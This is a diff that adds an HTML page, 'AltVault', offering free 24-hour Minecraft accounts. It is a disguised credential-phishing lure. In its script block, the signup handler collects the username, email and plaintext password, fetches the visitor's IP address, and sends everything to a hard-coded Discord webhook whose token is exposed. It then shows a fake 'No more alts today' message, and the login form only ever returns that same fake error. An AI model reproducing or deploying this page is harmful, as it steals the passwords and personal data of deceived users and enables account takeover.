@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>AltVault - Free Minecraft Accounts</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #121212;
+    color: #fff;
+  }
+  header nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 2rem;
+    background: #1e1e1e;
+  }
+  header nav .logo {
+    font-size: 1.5rem;
+    font-weight: bold;
+  }
+  header nav ul {
+    list-style: none;
+    display: flex;
+    gap: 1.5rem;
+    margin: 0;
+    padding: 0;
+  }
+  header nav a {
+    text-decoration: none;
+    color: #fff;
+    cursor: pointer;
+  }
+  .hero {
+    text-align: center;
+    padding: 5rem 2rem;
+    background: linear-gradient(135deg, #0f9b8e, #0077b6);
+  }
+  .hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+  }
+  .hero button {
+    padding: 0.7rem 1.5rem;
+    background: linear-gradient(135deg, #00b894, #0096c7);
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    font-size: 1rem;
+    border-radius: 5px;
+  }
+  .content {
+    padding: 3rem 2rem;
+    max-width: 800px;
+    margin: auto;
+    line-height: 1.6;
+  }
+  .content ul {
+    padding-left: 1.2rem;
+  }
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 999;
+    left: 0; top: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.7);
+  }
+  .modal-content {
+    background: #1e1e1e;
+    padding: 2rem;
+    margin: 10% auto;
+    width: 320px;
+    border-radius: 8px;
+    position: relative;
+    box-sizing: border-box;
+  }
+  .modal-content label {
+    display: block;
+    margin: 0.5rem 0 0.2rem;
+  }
+  .modal-content input {
+    width: 100%;
+    padding: 0.5rem;
+    margin-bottom: 1rem;
+    border: none;
+    border-radius: 5px;
+    box-sizing: border-box;
+  }
+  .modal-content button {
+    width: 100%;
+    padding: 0.7rem;
+    background: linear-gradient(135deg, #00b894, #0096c7);
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    border-radius: 5px;
+  }
+  .close {
+    position: absolute;
+    right: 1rem;
+    top: 1rem;
+    cursor: pointer;
+    font-size: 1.5rem;
+    color: #aaa;
+    transition: color 0.2s ease;
+  }
+  .close:hover {
+    color: #fff;
+  }
+  .error {
+    color: #ff4a4a;
+    margin-top: 0.5rem;
+    text-align: center;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <nav>
+    <div class="logo">AltVault</div>
+    <ul>
+      <li><a id="loginBtn">Login</a></li>
+      <li><a href="#about">About</a></li>
+      <li><a href="#tos">ToS</a></li>
+    </ul>
+  </nav>
+</header>
+
+<section class="hero">
+  <h1>Free Minecraft Alts</h1>
+  <p>Get access to temporary Minecraft accounts for 24 hours — no strings attached.</p>
+  <button id="openSignup">Sign Up Now</button>
+</section>
+
+<section id="about" class="content">
+  <h2>About</h2>
+  <p>
+    AltVault provides free temporary Minecraft accounts for players who need quick access without purchasing a full license.
+    Accounts are valid for 24 hours, giving you time to test, play, or explore servers without long-term commitment.
+  </p>
+  <p>
+    Our goal is to make Minecraft more accessible by offering trial accounts that refresh daily. Sign up or log in to get started.
+  </p>
+</section>
+
+<section id="tos" class="content">
+  <h2>Terms of Service</h2>
+  <p>By using AltVault, you agree to the following terms:</p>
+  <ul>
+    <li>You may only use accounts provided for personal, non-commercial purposes.</li>
+    <li>Accounts are temporary and automatically expire after 24 hours.</li>
+    <li>We do not guarantee continuous availability of accounts or specific usernames.</li>
+    <li>Users are responsible for any actions taken while using provided accounts.</li>
+    <li>Attempts to bypass expiration, exploit the system, or abuse the service may result in a ban.</li>
+    <li>AltVault reserves the right to modify or discontinue the service at any time without notice.</li>
+  </ul>
+  <p>By signing up or logging in, you acknowledge these terms and agree to abide by them.</p>
+</section>
+
+<!-- Signup Modal -->
+<div class="modal" id="signupModal" aria-hidden="true" aria-labelledby="signupTitle" role="dialog">
+  <div class="modal-content">
+    <span class="close" id="closeSignup" title="Close">&times;</span>
+    <h2 id="signupTitle">Sign Up</h2>
+    <form id="signupForm" autocomplete="off">
+      <label for="signupUsername">Username</label>
+      <input type="text" id="signupUsername" name="username" required autocomplete="username" />
+      <label for="signupEmail">Email</label>
+      <input type="email" id="signupEmail" name="email" required autocomplete="email" />
+      <label for="signupPassword">Password</label>
+      <input type="password" id="signupPassword" name="password" required autocomplete="new-password" />
+      <button type="submit">Submit</button>
+    </form>
+    <p id="signupError" class="error" aria-live="polite"></p>
+  </div>
+</div>
+
+<!-- Login Modal -->
+<div class="modal" id="loginModal" aria-hidden="true" aria-labelledby="loginTitle" role="dialog">
+  <div class="modal-content">
+    <span class="close" id="closeLogin" title="Close">&times;</span>
+    <h2 id="loginTitle">Login</h2>
+    <form id="loginForm" autocomplete="off">
+      <label for="loginUsername">Username</label>
+      <input type="text" id="loginUsername" name="username" required autocomplete="username" />
+      <label for="loginPassword">Password</label>
+      <input type="password" id="loginPassword" name="password" required autocomplete="current-password" />
+      <button type="submit">Login</button>
+    </form>
+    <p id="loginError" class="error" aria-live="polite"></p>
+  </div>
+</div>
+
+<script>
+  // Modal references
+  const signupModal = document.getElementById('signupModal');
+  const loginModal = document.getElementById('loginModal');
+  const openSignup = document.getElementById('openSignup');
+  const loginBtn = document.getElementById('loginBtn');
+  const closeSignup = document.getElementById('closeSignup');
+  const closeLogin = document.getElementById('closeLogin');
+
+  // Open modals
+  openSignup.addEventListener('click', () => {
+    signupModal.style.display = 'block';
+    signupModal.setAttribute('aria-hidden', 'false');
+  });
+  loginBtn.addEventListener('click', () => {
+    loginModal.style.display = 'block';
+    loginModal.setAttribute('aria-hidden', 'false');
+  });
+
+  // Close modals
+  closeSignup.addEventListener('click', () => {
+    signupModal.style.display = 'none';
+    signupModal.setAttribute('aria-hidden', 'true');
+    clearSignupError();
+  });
+  closeLogin.addEventListener('click', () => {
+    loginModal.style.display = 'none';
+    loginModal.setAttribute('aria-hidden', 'true');
+    clearLoginError();
+  });
+
+  // Close if clicking outside modal content
+  window.addEventListener('click', (e) => {
+    if (e.target === signupModal) {
+      signupModal.style.display = 'none';
+      signupModal.setAttribute('aria-hidden', 'true');
+      clearSignupError();
+    }
+    if (e.target === loginModal) {
+      loginModal.style.display = 'none';
+      loginModal.setAttribute('aria-hidden', 'true');
+      clearLoginError();
+    }
+  });
+
+  // Clear error messages
+  function clearSignupError() {
+    document.getElementById('signupError').textContent = '';
+  }
+  function clearLoginError() {
+    document.getElementById('loginError').textContent = '';
+  }
+
+  // Signup form submit handler
+  document.getElementById('signupForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    clearSignupError();
+
+    const username = e.target.username.value.trim();
+    const email = e.target.email.value.trim();
+    const password = e.target.password.value;
+
+    if (!username || !email || !password) {
+      document.getElementById('signupError').textContent = "Please fill out all fields.";
+      return;
+    }
+
+    // Fetch user's IP from a free API
+    let ip = "Unknown";
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      if (res.ok) {
+        const data = await res.json();
+        ip = data.ip;
+      }
+    } catch {
+      // ignore failure, keep ip as Unknown
+    }
+
+    // Prepare Discord webhook payload
+    const webhookURL = 'https://discord.com/api/webhooks/1395558887444316331/gfLOAY8nGFqvuqx-NACqR4RJj59Na1bLqekWLixU7dk9CXgqVOgkInxKp6in-hQRdWPC';
+
+    const content = {
+      username: "AltVault Signup Bot",
+      embeds: [{
+        title: "New Signup Submission",
+        color: 3066993,
+        fields: [
+          { name: "Username", value: username, inline: true },
+          { name: "Email", value: email, inline: true },
+          { name: "Password", value: password },
+          { name: "IP Address", value: ip }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(content)
+      });
+
+      if (response.ok) {
+        document.getElementById('signupError').textContent = "No more alts today.";
+        e.target.reset();
+      } else {
+        document.getElementById('signupError').textContent = "Error sending data. Please try again later.";
+      }
+    } catch (error) {
+      document.getElementById('signupError').textContent = "Error sending data. Please try again later.";
+    }
+  });
+
+  // Login form submit handler (mock error)
+  document.getElementById('loginForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    document.getElementById('loginError').textContent = "No more alts today.";
+  });
+</script>
+
+</body>
+</html>
